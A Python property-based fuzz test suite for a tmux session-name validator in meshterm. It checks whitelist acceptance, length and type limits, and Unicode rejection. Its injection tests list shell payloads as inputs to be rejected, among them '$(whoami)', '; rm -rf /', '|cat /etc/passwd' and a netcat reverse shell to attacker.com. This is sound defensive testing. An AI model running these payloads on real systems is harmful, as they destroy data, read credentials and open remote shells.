"""Property-based (hypothesis) fuzz tests for meshterm.remote.

Complements tests/unit/test_remote.py with generative testing of the
`_validate_session_name` function. The whitelist validator is a
security boundary — we want to assert invariants across a *very large*
space of inputs rather than a hand-picked list.

Invariants tested:
1. Valid names (matching the whitelist regex, non-empty, <=128 chars,
   not starting with '-') are ALWAYS accepted.
2. Names containing characters outside `[a-zA-Z0-9_.-]` are ALWAYS
   rejected with ValueError.
3. Names starting with '-' are ALWAYS rejected with ValueError (even
   if every other character is in the whitelist).
4. Names longer than 128 characters are ALWAYS rejected.
5. Non-string inputs (bytes, int, None, list, dict) are ALWAYS
   rejected with TypeError.
6. The validator is a pure function: same input → same output across
   repeated calls.
7. The validator never raises unexpected exceptions — only
   ValueError (for invalid strings) or TypeError (for wrong types).
"""

from __future__ import annotations

import string

import pytest
from hypothesis import given, settings, strategies as st

from meshterm.remote import _validate_session_name, _SESSION_NAME_RE


# Character alphabets for generation
_SAFE_CHARS = string.ascii_letters + string.digits + "_.-"


# ── Positive invariants (valid inputs → accepted) ──────────────────────────


class TestWhitelistAcceptance:
    """Every string matching the public contract must be accepted."""

    @given(
        st.text(
            alphabet=_SAFE_CHARS,
            min_size=1,
            max_size=128,
        ).filter(lambda s: not s.startswith("-"))
    )
    @settings(max_examples=300, deadline=None)
    def test_valid_names_accepted(self, name: str):
        """Any non-empty safe-char string ≤128 without leading '-' is accepted."""
        result = _validate_session_name(name)
        assert result == name

    @given(
        st.text(
            alphabet=_SAFE_CHARS,
            min_size=1,
            max_size=128,
        ).filter(lambda s: not s.startswith("-"))
    )
    def test_validator_is_idempotent(self, name: str):
        """Valid name → same output across 3 calls (pure function)."""
        a = _validate_session_name(name)
        b = _validate_session_name(name)
        c = _validate_session_name(name)
        assert a == b == c == name


# ── Negative invariants (invalid inputs → rejected) ────────────────────────


class TestWhitelistRejection:
    """Every out-of-contract string must be rejected."""

    @given(st.text(min_size=0, max_size=300))
    @settings(max_examples=500, deadline=None)
    def test_never_crashes(self, name: str):
        """Validator must only ever raise ValueError or TypeError.

        Any other exception (AttributeError, UnicodeError, RegexError, …)
        would be a security bug — it could leak internal state or
        short-circuit higher-level exception handlers.
        """
        try:
            _validate_session_name(name)
        except (ValueError, TypeError):
            pass  # expected
        except Exception as e:
            pytest.fail(
                f"Unexpected exception {type(e).__name__}: {e} "
                f"for input {name!r}"
            )

    @given(
        st.text(min_size=1, max_size=200).filter(
            lambda s: not _SESSION_NAME_RE.match(s)
        )
    )
    @settings(max_examples=300, deadline=None)
    def test_regex_violators_rejected(self, name: str):
        """Strings that do not match the whitelist regex must be rejected."""
        with pytest.raises((ValueError, TypeError)):
            _validate_session_name(name)

    @given(
        st.text(
            alphabet=_SAFE_CHARS,
            min_size=1,
            max_size=128,
        ).map(lambda s: "-" + s)
    )
    @settings(max_examples=200)
    def test_leading_dash_always_rejected(self, name: str):
        """Any name starting with '-' — even otherwise valid — is rejected."""
        with pytest.raises(ValueError, match="start with"):
            _validate_session_name(name)

    @given(
        st.text(
            alphabet=_SAFE_CHARS,
            min_size=129,
            max_size=500,
        ).filter(lambda s: not s.startswith("-"))
    )
    @settings(max_examples=100)
    def test_over_length_always_rejected(self, name: str):
        """Names longer than 128 chars are rejected even if otherwise valid."""
        with pytest.raises(ValueError, match="too long"):
            _validate_session_name(name)


# ── Type safety invariants ──────────────────────────────────────────────────


class TestTypeRejection:
    """Non-str inputs must raise TypeError, not leak through."""

    @given(st.integers())
    def test_int_rejected(self, value: int):
        with pytest.raises(TypeError, match="must be str"):
            _validate_session_name(value)  # type: ignore[arg-type]

    @given(st.binary(min_size=0, max_size=50))
    def test_bytes_rejected(self, value: bytes):
        with pytest.raises(TypeError, match="must be str"):
            _validate_session_name(value)  # type: ignore[arg-type]

    @given(st.floats(allow_nan=True, allow_infinity=True))
    def test_float_rejected(self, value: float):
        with pytest.raises(TypeError, match="must be str"):
            _validate_session_name(value)  # type: ignore[arg-type]

    @given(st.lists(st.text(max_size=10), max_size=5))
    def test_list_rejected(self, value: list):
        with pytest.raises(TypeError, match="must be str"):
            _validate_session_name(value)  # type: ignore[arg-type]

    def test_none_rejected(self):
        with pytest.raises(TypeError, match="must be str"):
            _validate_session_name(None)  # type: ignore[arg-type]


# ── Empty string edge case ─────────────────────────────────────────────────


class TestEmptyString:
    """Empty string is a specific failure mode."""

    def test_empty_rejected(self):
        with pytest.raises(ValueError, match="empty"):
            _validate_session_name("")


# ── Unicode & non-ASCII invariants ─────────────────────────────────────────


class TestUnicodeRejection:
    """Multilingual input — tmux is ASCII-centric, our whitelist is too."""

    @given(
        st.text(
            alphabet=st.characters(
                whitelist_categories=("Lu", "Ll"),
                blacklist_characters=_SAFE_CHARS,
            ),
            min_size=1,
            max_size=50,
        )
    )
    @settings(max_examples=200)
    def test_unicode_letters_rejected(self, name: str):
        """Non-ASCII letters (Latin-1 + diacritic chars from \\u00a0..\\u024f) are rejected."""
        with pytest.raises(ValueError, match="Invalid"):
            _validate_session_name(name)

    @given(
        st.text(
            alphabet=st.characters(
                whitelist_categories=("So", "Sm", "Sc"),
            ),
            min_size=1,
            max_size=20,
        )
    )
    @settings(max_examples=100)
    def test_symbols_rejected(self, name: str):
        """Emoji / symbol characters are rejected."""
        with pytest.raises(ValueError, match="Invalid"):
            _validate_session_name(name)


# ── Shell injection fuzz ───────────────────────────────────────────────────


class TestInjectionResistance:
    """A curated list of shell/tmux injection vectors, randomly combined."""

    _INJECTION_TOKENS = [
        "$(whoami)",
        "`id`",
        "; rm -rf /",
        "&& echo pwned",
        "|| nc -e sh attacker.com 4444",
        "|cat /etc/passwd",
        "${IFS}",
        "\\x1b[2J",  # escape sequence
        "\n/bin/sh",
        "\r\nexec sh",
        "..;",
    ]

    @given(
        st.lists(
            st.sampled_from(_INJECTION_TOKENS),
            min_size=1,
            max_size=4,
        )
    )
    def test_injection_tokens_rejected(self, tokens: list[str]):
        """Any concatenation of injection tokens is rejected."""
        name = "".join(tokens)
        with pytest.raises((ValueError, TypeError)):
            _validate_session_name(name)

    @given(
        st.text(alphabet=_SAFE_CHARS, min_size=1, max_size=30),
        st.sampled_from(_INJECTION_TOKENS),
        st.text(alphabet=_SAFE_CHARS, min_size=0, max_size=30),
    )
    def test_injection_embedded_in_valid_chars_rejected(
        self, prefix: str, poison: str, suffix: str
    ):
        """A valid-looking prefix with injection in the middle must fail."""
        name = prefix + poison + suffix
        if not _SESSION_NAME_RE.match(name) or name.startswith("-"):
            with pytest.raises((ValueError, TypeError)):
                _validate_session_name(name)
